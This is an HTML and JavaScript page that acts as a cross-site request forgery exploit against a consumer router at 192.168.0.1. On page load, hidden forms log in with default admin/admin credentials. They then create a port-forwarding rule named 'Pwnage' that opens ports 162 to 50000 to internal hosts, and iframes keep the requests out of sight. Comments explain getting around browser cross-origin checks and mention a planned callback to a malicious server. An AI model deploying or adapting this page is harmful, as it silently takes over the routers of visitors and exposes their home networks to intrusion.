
<!-- First form logs us in -->

<form id="login" action="http://192.168.0.1/goform/login" method=POST name="login" target="login_frame">

    <input type="password" name="loginUsername" value="admin">
    <input type="password" name="loginPassword" value="admin">
    <input id='btnLogin' type="submit" value="Login">

</form>

<!-- Second form sets settings -->
<!-- Ports from 162 - 50000 since UDP is default 161 (plus all the good ports are open later anyway). Could potentially change UDP, or set ranges from 0 - 160 as well -->
<form id="hack" action="http://192.168.0.1/goform/RgForwarding" method="POST" name="login" target="hack_frame">

    <input type="text" name="PortForwardingCreateRemove" value="0"/>
    <input type="text" name="PortForwardingExtIp" value="0.0.0.0"/>
    <input type="text" name="PortForwardingExtStartPort" value="162" />
    <input type="text" name="PortForwardingExtEndPort" value="50000"/>
    <input type="text" id="ip" name="PortForwardingLocalIp" />
    <input type="text" name="PortForwardingLocalStartPort" value="162"/>
    <input type="text" name="PortForwardingLocalEndPort"  value="50000"/>
    <input type="text" name="PortForwardingProtocol"  value="4"/>
    <input type="text" name="PortForwardingDesc"  value="Pwnage"/>
    <input type="text" name="PortForwardingEnabled" value="1" />
    <input type="text" name="PortForwardingApply" value="2" />
    <input type="text" name="PortForwardingTable" value="0" />

</form>

<!-- Iframes prevent need for popups -->
<iframe name="login_frame"></iframe>
<iframe name="hack_frame"></iframe>

<script type="text/javascript">

    // Submitting forms instead of doing XMLHttpRequest gets around
    // Chrome and other modern browsers complaining about Access-Control-Allow-Origin
    var wait = 1000;

    var login = document.getElementById('login');
    setTimeout(function(evt){ login.submit() }, wait);

    var hack = document.getElementById('hack');
    var ip = document.getElementById('ip');
    var base = "192.168.0.";
    var i = 10;
    var rinse = function(){
        if(i >= 256) return; // Impossible IPs say what?
        ip.value = base + i;
        hack.submit();
        i++;
        // Callback to malicious server to indicate the deed was done.
    }
    setTimeout(rinse, wait * 2);

    // Potentially have callback from server after attempt to exploit
    // then rinse and repeat with different ip

</script>
